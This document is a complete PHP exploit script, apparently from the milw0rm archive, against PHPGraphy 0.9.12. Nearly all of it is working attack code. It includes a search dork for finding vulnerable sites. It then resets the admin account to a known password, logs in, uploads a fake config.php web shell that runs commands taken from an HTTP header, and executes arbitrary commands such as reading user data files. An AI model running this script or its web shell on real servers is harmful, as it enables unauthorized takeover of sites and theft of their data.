@@ -1,0 +1,206 @@
+<?php
+print_r('
+---------------------------------------------------------------------------
+PHPGraphy 0.9.12 Zend_Hash_Del_Key_Or_Index/privilege escalation/
+/remote command execution exploit
+by rgod
+dork: intext:"This site is using phpGraphy" | intitle:"my phpgraphy site"
+mail: retrog@alice.it
+site: http://retrogod.altervista.org
+---------------------------------------------------------------------------
+');
+
+/*
+works against register_globals=on
+*/
+
+if ($argc<3) {
+    print_r('
+---------------------------------------------------------------------------
+Usage: php '.$argv[0].' host path cmd OPTIONS
+host:      target server (ip/hostname)
+path:      path to PHPGraphy
+Options:
+ -p[port]:    specify a port other than 80
+ -P[ip:port]: specify a proxy
+Example:
+php '.$argv[0].' localhost /phpgraphy/ ls -la -P1.1.1.1:80
+php '.$argv[0].' localhost / cat ./data/users.dat -p81
+---------------------------------------------------------------------------
+');
+    die;
+}
+error_reporting(0);
+ini_set("max_execution_time",0);
+ini_set("default_socket_timeout",5);
+
+function quick_dump($string)
+{
+  $result='';$exa='';$cont=0;
+  for ($i=0; $i<=strlen($string)-1; $i++)
+  {
+   if ((ord($string[$i]) <= 32 ) | (ord($string[$i]) > 126 ))
+   {$result.="  .";}
+   else
+   {$result.="  ".$string[$i];}
+   if (strlen(dechex(ord($string[$i])))==2)
+   {$exa.=" ".dechex(ord($string[$i]));}
+   else
+   {$exa.=" 0".dechex(ord($string[$i]));}
+   $cont++;if ($cont==15) {$cont=0; $result.="\r\n"; $exa.="\r\n";}
+  }
+ return $exa."\r\n".$result;
+}
+$proxy_regex = '(\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\:\d{1,5}\b)';
+
+function sendpacketii($packet)
+{
+  global $proxy, $host, $port, $html, $proxy_regex;
+  if ($proxy=='') {
+    $ock=fsockopen(gethostbyname($host),$port);
+    if (!$ock) {
+      echo 'No response from '.$host.':'.$port; die;
+    }
+  }
+  else {
+	$c = preg_match($proxy_regex,$proxy);
+    if (!$c) {
+      echo 'Not a valid proxy...';die;
+    }
+    $parts=explode(':',$proxy);
+    echo "Connecting to ".$parts[0].":".$parts[1]." proxy...\r\n";
+    $ock=fsockopen($parts[0],$parts[1]);
+    if (!$ock) {
+      echo 'No response from proxy...';die;
+	}
+  }
+  fputs($ock,$packet);
+  if ($proxy=='') {
+    $html='';
+    while (!feof($ock)) {
+      $html.=fgets($ock);
+    }
+  }
+  else {
+    $html='';
+    while ((!feof($ock)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$html))) {
+      $html.=fread($ock,1);
+    }
+  }
+  fclose($ock);
+}
+
+$host=$argv[1];
+$path=$argv[2];
+$port=80;
+$proxy="";
+for ($i=3; $i<$argc; $i++){
+$temp=$argv[$i][0].$argv[$i][1];
+if (($temp<>"-p") and ($temp<>"-P")) {$cmd.=" ".$argv[$i];}
+if ($temp=="-p")
+{
+  $port=str_replace("-p","",$argv[$i]);
+}
+if ($temp=="-P")
+{
+  $proxy=str_replace("-P","",$argv[$i]);
+}
+}
+if (($path[0]<>'/') or ($path[strlen($path)-1]<>'/')) {echo 'Error... check the path!'; die;}
+if ($proxy=='') {$p=$path;} else {$p='http://'.$host.':'.$port.$path;}
+
+//reset admin password...
+//let's reactivate :) the *install mode* to do that
+//you will be able to login with user -> suntzu, password -> suntzu
+$data ="login=suntzu";
+$data.="&password=suntzu";
+$data.="&security_level=999"; //god
+$data.="&uid=0";
+$data.="&submit=Submit";
+$packet ="POST ".$p."index.php?uid=0 HTTP/1.0\r\n";
+$packet.="Host: ".$host."\r\n";
+$packet.="User-Agent: Lynx/2.8.3dev.8 libwww-FM/2.14FM\r\n";
+$packet.="Referer: http://".$host.$path."index.php\r\n";
+$packet.="Accept-Language: en\r\n";
+$packet.="Content-Type: application/x-www-form-urlencoded\r\n";
+$packet.="Accept-Encoding: text/plain\r\n";
+$packet.="Content-Length: ".strlen($data)."\r\n";
+$packet.="Connection: Close\r\n";
+$packet.="Cookie: mode=um; install_mode=1; 2095608056=1; -285023552=1; action=edit;\r\n\r\n";
+$packet.=$data;
+sendpacketii($packet);
+sleep(2);
+
+//login as admin...
+$data ="user=suntzu";
+$data.="&pass=suntzu";
+$data.="&dir=";
+$data.="&rememberme=on";
+$data.="&startlogin=1";
+$packet ="POST ".$p."index.php HTTP/1.0\r\n";
+$packet.="Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, */*\r\n";
+$packet.="Referer: http://".$host.$path."index.php\r\n";
+$packet.="Accept-Language: en\r\n";
+$packet.="Content-Type: application/x-www-form-urlencoded\r\n";
+$packet.="User-Agent: Lynx/2.8.3dev.8 libwww-FM/2.14FM\r\n";
+$packet.="Host: ".$host."\r\n";
+$packet.="Content-Length: ".strlen($data)."\r\n";
+$packet.="Pragma: no-cache\r\n";
+$packet.="Connection: keep-alive\r\n\r\n";
+$packet.=$data;
+sendpacketii($packet);
+$temp=explode("Set-Cookie: ",$html);
+$cookie="";
+for ($i=1; $i<count($temp); $i++)
+{
+$temp2=explode(" ",$temp[$i]);
+$cookie.=" ".$temp2[0];
+}
+echo "cookie -> ".$cookie."\n";
+sleep(1);
+
+//upload the *evil* shell
+//some tricks with "config" and "dir" to escape from the pictures/ dir, .htaccess protected
+//you need a writable folder, if not succeeded try some of theese paths: ./themes, ./docs, ./base
+//for "dir" argument, let's create a *fake* config.php in main folder
+$data='-----------------------------7d61bcd1f033e
+Content-Disposition: form-data; name="pictures[]"; filename="config.php";
+
+<?php set_time_limit(0);error_reporting(7);echo "my_delim"; passthru($_SERVER["HTTP_CLIENT_IP"]); echo "my_delim";?>
+-----------------------------7d61bcd1f033e
+Content-Disposition: form-data; name="picupload"
+
+1
+-----------------------------7d61bcd1f033e--
+';
+$packet ="POST ".$p."index.php HTTP/1.0\r\n";
+$packet.="Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, */*\r\n";
+$packet.="Referer: http:/".$host.$path."index.php\r\n";
+$packet.="Accept-Language: en\r\n";
+$packet.="Content-Type: multipart/form-data; boundary=---------------------------7d61bcd1f033e\r\n";
+$packet.="User-Agent: Lynx/2.8.3dev.8 libwww-FM/2.14FM\r\n";
+$packet.="Host: ".$host."\r\n";
+$packet.="Content-Length: ".strlen($data)."\r\n";
+$packet.="Pragma: no-cache\r\n";
+$packet.="Cookie: config=; -578819025=1; -747504677=1; dir=.; 2087386682=1; 2090185412=1; ".$cookie."\r\n";
+$packet.="Connection: keep-alive\r\n\r\n";
+$packet.=$data;
+sendpacketii($packet);
+sleep(1);
+
+//launch commands...
+$packet ="GET ".$p."config.php HTTP/1.0\r\n";
+$packet.="CLIENT-IP: ".$cmd."\r\n";
+$packet.="Host: ".$host."\r\n";
+$packet.="Connection: Close\r\n\r\n";
+sendpacketii($packet);
+if (eregi("my_delim",$html)){
+    $temp=explode("my_delim",$html);
+    echo $temp[1];
+}
+else {
+    echo "exploit failed...";
+}
+?>
+
+# milw0rm.com [2006-11-30]
